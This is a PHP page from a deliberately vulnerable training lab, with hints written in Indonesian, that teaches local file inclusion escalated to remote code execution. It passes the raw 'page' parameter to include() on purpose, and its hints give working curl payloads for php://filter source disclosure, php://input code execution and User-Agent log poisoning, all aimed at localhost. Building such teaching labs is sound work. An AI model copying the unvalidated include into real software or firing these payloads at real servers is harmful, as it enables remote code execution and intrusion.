<?php
$title = 'Lab 7: LFI to RCE (PHP Wrappers & Log Poisoning)';
$page = $_GET['page'] ?? '';
$cmd = $_GET['cmd'] ?? null;
include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: tidak ada validasi sama sekali (<code>include($_GET['page'])</code>
mentah) &mdash; tapi kali ini kita naikkan level dari sekadar membaca file menjadi
<strong>eksekusi kode (RCE)</strong>, lewat tiga teknik berbeda:</p>
<ol class="hint">
  <li><strong>Source code disclosure lewat <code>php://filter</code>.</strong>
  Meng-<code>include()</code> file <code>.php</code> langsung akan MENGEKSEKUSINYA, bukan
  menampilkan source code-nya. Bungkus dengan filter <code>convert.base64-encode</code> supaya
  isinya dikembalikan sebagai teks (base64), bukan dieksekusi:
  <code>?page=php://filter/convert.base64-encode/resource=pages/secret_notes.php</code>
  &mdash; lalu decode base64 hasilnya untuk menemukan komentar rahasia di dalamnya.</li>
  <li><strong>RCE lewat <code>php://input</code>.</strong> Wrapper ini membuat
  <code>include()</code> mengeksekusi BODY request sebagai kode PHP. Kirim lewat POST:
  <div class="result-box">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' \
  "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=php://input&amp;cmd=id"</div></li>
  <li><strong>Log poisoning.</strong> Header <code>User-Agent</code> dari SETIAP request ke
  aplikasi ini dicatat mentah-mentah ke <code>app_data/access.log</code> (lihat
  <code>header.php</code>). Kirim User-Agent berisi payload PHP, lalu include log tersebut:
  <div class="result-box">curl -s -A '&lt;?php system($_GET["cmd"]); ?&gt;' "http://localhost:8079/lfi/index.php" &gt; /dev/null
curl -s "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=../app_data/access.log&amp;cmd=id"</div></li>
</ol>
</details>

<form method="get">
  <label>Page</label><br>
  <input type="text" name="page" value="<?php echo htmlspecialchars($page); ?>"><br>
  <label>cmd (dipakai oleh payload <code>system($_GET['cmd'])</code> di atas)</label><br>
  <input type="text" name="cmd" value="<?php echo htmlspecialchars($cmd ?? ''); ?>">
  <button type="submit">Load</button>
</form>

<div class="result-box">
<?php if ($page !== ''): include $page; endif; ?>
</div>

<?php include 'footer.php'; ?>
